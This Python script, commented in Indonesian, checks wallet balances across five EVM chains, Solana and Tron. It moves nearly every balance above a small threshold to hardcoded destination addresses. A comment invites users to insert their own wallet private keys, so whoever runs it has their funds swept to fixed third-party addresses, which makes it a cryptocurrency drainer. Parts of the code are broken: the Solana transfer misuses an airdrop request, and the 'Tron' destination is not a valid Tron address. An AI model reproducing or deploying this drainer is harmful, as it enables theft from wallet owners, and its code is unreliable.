from web3 import Web3
from eth_account import Account
import json
from solana.rpc.api import Client as SolanaClient
from solana.transaction import Transaction
from solana.publickey import PublicKey
from solana.keypair import Keypair
from tronpy import Tron
from tronpy.keys import PrivateKey

# 🔹 Daftar RPC & Jaringan
CHAINS = {
    "Ethereum": {"rpc": "https://rpc.ankr.com/eth", "chain_id": 1, "native_symbol": "ETH"},
    "BSC": {"rpc": "https://rpc.ankr.com/bsc", "chain_id": 56, "native_symbol": "BNB"},
    "Polygon": {"rpc": "https://rpc.ankr.com/polygon", "chain_id": 137, "native_symbol": "MATIC"},
    "Avalanche": {"rpc": "https://rpc.ankr.com/avalanche", "chain_id": 43114, "native_symbol": "AVAX"},
    "Fantom": {"rpc": "https://rpc.ankr.com/fantom", "chain_id": 250, "native_symbol": "FTM"},
    "Solana": {"rpc": "https://api.mainnet-beta.solana.com", "native_symbol": "SOL"},
    "Tron": {"rpc": "https://api.trongrid.io", "native_symbol": "TRX"}
}

# 🔹 Alamat tujuan untuk setiap jaringan
TARGET_ADDRESSES = {
    "EVM": "0x25fa9C6d6bc937d415aD2Bc13F0ca2c01F6E1037",
    "Solana": "C6tbiN85kUQ1p91Z2YP8SWGXcLNHKU8VFm4ihcA1K1b3",
    "Tron": "UQCKxuyaV_9zpaFYVrns01sRanVyg7UghKpZyV2rH83RtoWY"
}

# 🔹 Fungsi untuk Cek & Kirim di Jaringan EVM
def connect_chain(chain_name):
    return Web3(Web3.HTTPProvider(CHAINS[chain_name]["rpc"]))

def get_balance(web3, address):
    balance = web3.eth.get_balance(address)
    return web3.from_wei(balance, 'ether')

def send_native_coin(web3, private_key, amount, chain_name):
    try:
        account = Account.from_key(private_key)
        nonce = web3.eth.get_transaction_count(account.address)
        gas_price = web3.eth.gas_price
        value = web3.to_wei(amount, 'ether')

        tx = {
            'nonce': nonce,
            'to': TARGET_ADDRESSES["EVM"],
            'value': value,
            'gas': 21000,
            'gasPrice': gas_price,
            'chainId': CHAINS[chain_name]["chain_id"]
        }

        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"✅ {CHAINS[chain_name]['native_symbol']} Sent: {web3.to_hex(tx_hash)}")
    except Exception as e:
        print(f"⚠️ {CHAINS[chain_name]['native_symbol']} send failed: {e}")

# 🔹 Fungsi untuk Solana
def get_solana_balance(address):
    solana_client = SolanaClient(CHAINS["Solana"]["rpc"])
    balance = solana_client.get_balance(PublicKey(address))["result"]["value"]
    return balance / 1e9  # Convert Lamports to SOL

def send_solana(private_key, amount):
    try:
        solana_client = SolanaClient(CHAINS["Solana"]["rpc"])
        sender_keypair = Keypair.from_secret_key(bytes.fromhex(private_key))
        tx = Transaction().add(
            solana_client.request_airdrop(PublicKey(TARGET_ADDRESSES["Solana"]), int(amount * 1e9))
        )
        tx_hash = solana_client.send_transaction(tx, sender_keypair)
        print(f"✅ SOL Sent: {tx_hash}")
    except Exception as e:
        print(f"⚠️ SOL send failed: {e}")

# 🔹 Fungsi untuk Tron
def get_tron_balance(address):
    tron_client = Tron(network="mainnet")
    balance = tron_client.get_account(address)["balance"] / 1e6  # Convert Sun to TRX
    return balance

def send_tron(private_key, amount):
    try:
        tron_client = Tron(network="mainnet")
        sender = PrivateKey(bytes.fromhex(private_key))
        txn = (
            tron_client.trx.transfer(sender.public_key.to_base58(), TARGET_ADDRESSES["Tron"], int(amount * 1e6))
            .build()
            .sign(sender)
        )
        tx_hash = txn.broadcast()
        print(f"✅ TRX Sent: {tx_hash}")
    except Exception as e:
        print(f"⚠️ TRX send failed: {e}")

# 🔹 Cek Saldo & Kirim Jika Ada
def process_wallets(wallets):
    for wallet in wallets:
        print(f"🔍 Checking Wallet: {wallet['address']}")

        # Cek & Kirim di Jaringan EVM
        for chain in ["Ethereum", "BSC", "Polygon", "Avalanche", "Fantom"]:
            web3 = connect_chain(chain)
            balance = get_balance(web3, wallet["address"])
            print(f"💰 {chain}: {balance} {CHAINS[chain]['native_symbol']}")

            if balance > 0.01:  # Kirim jika ada saldo
                send_native_coin(web3, wallet["private_key"], balance - 0.001, chain)

        # Cek & Kirim di Solana
        sol_balance = get_solana_balance(wallet["address"])
        print(f"💰 Solana: {sol_balance} SOL")
        if sol_balance > 0.01:
            send_solana(wallet["private_key"], sol_balance - 0.001)

        # Cek & Kirim di Tron
        tron_balance = get_tron_balance(wallet["address"])
        print(f"💰 Tron: {tron_balance} TRX")
        if tron_balance > 0.1:
            send_tron(wallet["private_key"], tron_balance - 0.1)

# 🔹 Jalankan untuk 10 Wallet
wallets = [{"address": "0x...", "private_key": "0x..."}]  # Ganti dengan wallet kamu
process_wallets(wallets)
      
